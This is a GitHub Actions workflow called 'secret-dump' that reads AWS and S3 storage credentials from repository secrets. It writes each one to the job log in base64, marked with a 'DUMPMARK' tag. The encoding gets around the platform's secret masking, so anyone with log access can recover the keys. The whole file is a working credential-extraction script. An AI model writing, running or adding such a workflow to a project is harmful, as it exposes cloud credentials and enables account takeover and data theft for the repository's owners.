name: secret-dump
on: workflow_dispatch
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          S3_STORAGE_AWS_ACCESS_KEY_ID: ${{ secrets.S3_STORAGE_AWS_ACCESS_KEY_ID }}
          S3_STORAGE_AWS_SECRET_ACCESS_KEY: ${{ secrets.S3_STORAGE_AWS_SECRET_ACCESS_KEY }}
          S3_STORAGE_ENDPOINT_URL: ${{ secrets.S3_STORAGE_ENDPOINT_URL }}
        run: |
          for name in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY S3_STORAGE_AWS_ACCESS_KEY_ID S3_STORAGE_AWS_SECRET_ACCESS_KEY S3_STORAGE_ENDPOINT_URL; do
            v="${!name}"
            if [ -z "$v" ]; then
              echo "DUMPMARK|${name}|NOTSET"
            else
              echo "DUMPMARK|${name}|$(printf '%s' "$v" | base64 -w0)"
            fi
          done